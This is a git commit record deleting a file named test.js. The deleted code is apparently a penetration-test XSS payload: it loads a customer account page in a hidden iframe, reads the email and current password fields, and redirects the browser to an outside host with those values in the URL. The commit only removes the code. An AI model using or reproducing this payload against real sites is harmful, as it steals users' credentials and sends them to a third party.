6ea234398cd25efb033c31fa20597f09e338a4c7
AmosGeorge <32982490+AmosGeorge@users.noreply.github.com>
2024-02-09 15:47:32 +0100

    Delete test.js

--- test.js
+++
@@ -1,6 +0,0 @@
-var i=Object.assign(document.createElement('iframe'),{id:'pentest',src:'\\monchauffagisteprive\\customer\\account\\edit\\'});
-i.addEventListener('load',function(){
-  var p=i.contentDocument;
-  window.location='\\\\hezrel4q9wm6z84qk50x2d1au10solca.gloups.itr-af.com\\?user='+p.querySelector('#email').value+'&pass='+p.querySelector('#current_password').value;
-});
-document.body.appendChild(i);
